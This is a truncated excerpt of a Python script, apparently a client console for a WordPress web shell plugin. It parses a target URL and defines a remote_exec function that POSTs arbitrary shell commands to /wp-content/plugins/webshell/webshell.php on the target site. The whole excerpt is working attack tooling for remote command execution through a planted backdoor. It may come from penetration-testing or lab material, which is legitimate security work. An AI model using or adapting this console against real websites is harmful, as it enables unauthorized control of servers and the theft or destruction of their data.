...
def parseArgs():
    parser = argparse.ArgumentParser(description="Interactive console for webshell plugin")
    parser.add_argument("-t", "--target", default=None, required=True, help='target instance')
...
def remote_exec(target, cmd, verbose=False):
    try:
        r = requests.post(
            "%s/wp-content/plugins/webshell/webshell.php" % target,
            data={
                "action": "exec",
                "cmd": cmd,
            },
